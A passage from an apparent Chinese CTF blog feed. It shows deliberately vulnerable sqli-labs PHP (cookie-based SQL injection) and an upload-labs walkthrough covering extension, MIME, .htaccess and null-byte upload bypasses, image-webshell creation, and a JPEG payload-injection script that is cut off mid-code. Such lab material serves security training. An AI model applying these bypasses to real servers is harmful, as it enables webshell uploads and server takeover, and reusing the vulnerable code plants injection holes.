class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">                <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">                print_r(mysql_error());</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $cookee = $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">            $format = <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">            $timestamp = time() + <span class="number">3600</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-21.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YOUR IP ADDRESS IS : &quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YOUR COOKIE : uname = <span class="subst">$cookee</span> and expires: &quot;</span> . date($format, $timestamp);</span><br><span class="line"></span><br><span class="line">            $cookee = base64_decode($cookee);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            $sql=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">            $result=mysql_query($sql);</span><br><span class="line">            <span class="keyword">if</span> (!$result)</span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . mysql_error());</span><br><span class="line">                    &#125;</span><br><span class="line">            $row = mysql_fetch_array($result);</span><br><span class="line">            <span class="keyword">if</span>($row)</span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .$row[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">                    <span class="comment">//echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;;</span></span><br><span class="line">                    &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot; Your Cookie is deleted&quot;</span>;</span><br><span class="line">                            setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode($row1[<span class="string">&#x27;username&#x27;</span>]), time()<span class="number">-3600</span>);</span><br><span class="line">                            header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    $fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite($fp,<span class="string">&#x27;Cookie:&#x27;</span>.$cookee.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fclose($fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这个闭合方式变成双引号就行了，20关的四种注入都行</p><h3 id="关键代码-21"><a href="#关键代码-21" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$cookee1 = <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs靶场通关手册</title>
      <link href="2019/10/16/upload-labs-wp/"/>
      <url>2019/10/16/upload-labs-wp/</url>
      
        <content type="html"><![CDATA[<p>本篇博客介绍了uploadlabs靶场通关指南！为了方便显示，这里把一句话写成phpinfo,并使用bp抓包!</p><a id="more"></a><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><strong>考察点：</strong>本地js检验</p><p><strong>通关方法：</strong></p><p>上传webshell时将其后缀改为.jpg或.png或.gif,再用bp抓包将其改为.php后缀</p><p>修改js代码，F12代开开发人员工具，修改checkFile()函数</p><p><img src="/2019/10/16/upload-labs-wp/20190926221545.png"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><strong>考察点：</strong>MIME类型检测</p><p><strong>通关方法：</strong></p><p>上传webshell时将其后缀改为.jpg或.png或.gif,再用bp抓包将其改为.php后缀</p><p><img src="/2019/10/16/upload-labs-wp/20190926222235.png"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>考察点：</strong>特殊后缀名绕过</p><p><strong>通关方法：</strong></p><p>因为没有js检测，直接上传.phtml后缀就可以，可以看到下面有个无法显示的图片，右键可以获取到图片的地址</p><p><img src="/2019/10/16/upload-labs-wp/20190926224743.png"></p><p>将其注释取消重启Apache即可解析</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>考察点：</strong>.htaccess绕过</p><p><strong>通关方法：</strong></p><p>先上传一个.htaccess文件，文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx&quot;&gt;  </span><br><span class="line">        SetHandler application&#x2F;x-httpd-php  </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>再上传一个test.xxx文件(写入webshell)，test.xxx就可以被解析成php代码执行</p><p><img src="/2019/10/16/upload-labs-wp/20190926225421.png"></p><p><img src="/2019/10/16/upload-labs-wp/20190926225837.png"></p><p><strong>注意：</strong>php版本问题可能会导致解析失败，亲测php5.2.17完美解析</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p><strong>考察点：</strong>大小写绕过</p><p><strong>通关方法：</strong></p><p>上传为.Php后缀的webshell</p><p><img src="/2019/10/16/upload-labs-wp/20190927103522.png"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><strong>考察点：</strong>后缀加空格绕过</p><p><strong>通关方法：</strong></p><p>用bp抓包将其改为.php后缀的webshell</p><p><img src="/2019/10/16/upload-labs-wp/20190927104647.png"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><strong>考察点：</strong>windows加.绕过(对文件命名时最后一个字符为.会自动忽略)</p><p><strong>通关方法：</strong></p><p>用bp抓包将其改为.php.后缀</p><p><img src="/2019/10/16/upload-labs-wp/20190927105020.png"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p><strong>考察点：</strong>windows::$DATA绕过绕过</p><p><strong>通关方法：</strong></p><p>用bp抓包将其改为.php::$DATA后缀</p><p><img src="/2019/10/16/upload-labs-wp/20190927105219.png"></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>考察点：</strong>后缀加. .绕过</p><p><strong>通关方法：</strong></p><p>用bp抓包将其改为.php. .后缀</p><p><img src="/2019/10/16/upload-labs-wp/20190927105455.png"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><strong>考察点：</strong>双写绕过</p><p><strong>通关方法：</strong></p><p>用bp抓包将其改为.pphphp后缀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">$file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">$file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure><p>可以看到源码中将可以当成php解析的后缀都替换成空了</p><p><strong>注意：</strong>文件名中的关键词也会替换</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><strong>考察点：</strong>%00截断绕过绕过白名单</p><p><strong>通关方法：</strong></p><pre><code>用bp抓包将save_path保存为：save_path=../upload/phpinfo.php%00$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;通过代码审计可以看出来，$_GET[‘save_path’]可以用%00绕过</code></pre><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p><strong>考察点：</strong>二进制00截断漏洞绕过白名单</p><p><strong>通关方法：</strong></p><pre><code>用bp抓包将save_path保存为：save_path=../upload/phpinfo.php**代表00和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。</code></pre><p><img src="/2019/10/16/upload-labs-wp/20190927113754.png"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p><strong>考察点：</strong>图片马</p><p><strong>通关方法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file &#x3D; fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    </span><br><span class="line">    $fileType &#x3D; &#39;&#39;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType &#x3D; &#39;jpg&#39;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType &#x3D; &#39;png&#39;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType &#x3D; &#39;gif&#39;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType &#x3D; &#39;unknown&#39;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由源码可知，是通过检测文件头(两个字节)来判断文件类型的</p><p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作方法：cmd下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg</span><br></pre></td></tr></table></figure><p>上传图片马，使用文件包含包含上传的图片马</p><p>或者在webshell前面一行加上GIF89a,并命名为.gif后缀文件，即可生成gif类型的图片马</p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><strong>考察点：</strong>图片马</p><p><strong>通关方法：</strong></p><p>源码<code>getimagesize()</code>函数获取文件类型，还是直接就可以利用图片马就可进行绕过</p><p><code>getimagesize()</code>函数是通过识别文件头来判别是否是图片文件的</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><strong>考察点：</strong>图片马</p><p><strong>通关方法：</strong></p><p>这里用到php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><strong>考察点：</strong>图片马+content-type+二次渲染</p><p><strong>通关方法：</strong></p><p>本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染</p><p>什么是二次渲染呢？二次渲染就是调用API，例如php的GD库，重新生成一张图片，在生成的过程中，把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染</p><p>对渲染/加载测试的攻击方式是代码注入绕过</p><p>对二次渲染攻击方式是攻击文件加载器自身</p><p>关于绕过二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了</p><p>将上传的图片下载到本地，使用16进制编辑器将其打开，发现其内容已经改变</p><h3 id="上传gif"><a href="#上传gif" class="headerlink" title="上传gif"></a>上传gif</h3><h3 id="上传png"><a href="#上传png" class="headerlink" title="上传png"></a>上传png</h3><h3 id="上传jpg"><a href="#上传jpg" class="headerlink" title="上传jpg"></a>上传jpg</h3><p>这里也采用国外大牛编写的脚本jpg_payload.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line"></span><br><span class="line">The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">1) Upload an arbitrary image via secured files upload script</span><br><span class="line">2) Save the processed image and launch:</span><br><span class="line">jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.</span><br><span class="line">If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">See also:</span><br><span class="line">https:&#x2F;&#x2F;www.idontplaydarts.com&#x2F;2012&#x2F;06&#x2F;encoding-web-shells-in-png-idat-chunks&#x2F;</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">$miniPayload &#x3D; &quot;&lt;?&#x3D;phpinfo();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;</span><br><span class="line">    die(&#39;php-gd is not installed&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($argv[1])) &#123;</span><br><span class="line">    die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">    $nullbytePayloadSize &#x3D; $pad;</span><br><span class="line">    $dis &#x3D; new DataInputStream($argv[1]);</span><br><span class="line">    $outStream &#x3D; file_get_contents($argv[1]);</span><br><span class="line">    $extraBytes &#x3D; 0;</span><br><span class="line">    $correctImage &#x3D; TRUE;</span><br><span class="line"></span><br><span class="line">    if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123;</span><br><span class="line">        die(&#39;Incorrect SOI marker&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123;</span><br><span class="line">        $marker &#x3D; $dis-&gt;readByte();</span><br><span class="line">        $size &#x3D; $dis-&gt;readShort() - 2;</span><br><span class="line">        $dis-&gt;skip($size);</span><br><span class="line">        if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123;</span><br><span class="line">            $startPos &#x3D; $dis-&gt;seek();</span><br><span class="line">            $outStreamTmp &#x3D; </span><br><span class="line">                substr($outStream, 0, $startPos) . </span><br><span class="line">                $miniPayload . </span><br><span class="line">                str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                substr($outStream, $startPos);</span><br><span class="line">            checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">            if($extraBytes !&#x3D;&#x3D; 0) &#123;</span><br><span class="line">                while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                    if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123;</span><br><span class="line">                        if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123;</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $stopPos &#x3D; $dis-&gt;seek() - 2;</span><br><span class="line">                $imageStreamSize &#x3D; $stopPos - $startPos;</span><br><span class="line">                $outStream &#x3D; </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    substr(</span><br><span class="line">                        str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                            substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                        0,</span><br><span class="line">                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                            substr($outStream, $stopPos);</span><br><span class="line">            &#125; elseif($correctImage) &#123;</span><br><span class="line">                $outStream &#x3D; $outStreamTmp;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;</span><br><span class="line">                die(&#39;Success!&#39;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unlink(&#39;payload_&#39;.$argv[1]);</span><br><span class="line">die(&#39;Something\&#39;s wrong&#39;);</span><br><span class="line"></span><br><span class="line">function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123;</span><br><span class="line">    global $correctImage;</span><br><span class="line">    file_put_contents($filename, $data);</span><br><span class="line">    $correctImage &#x3D; TRUE;</span><br><span class="line">    imagecreatefromjpeg($filename);</span><br><span class="line">    if($unlink)</span><br><span class="line">        unlink($filename);</span><br><span class="line">    return $correctImage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function 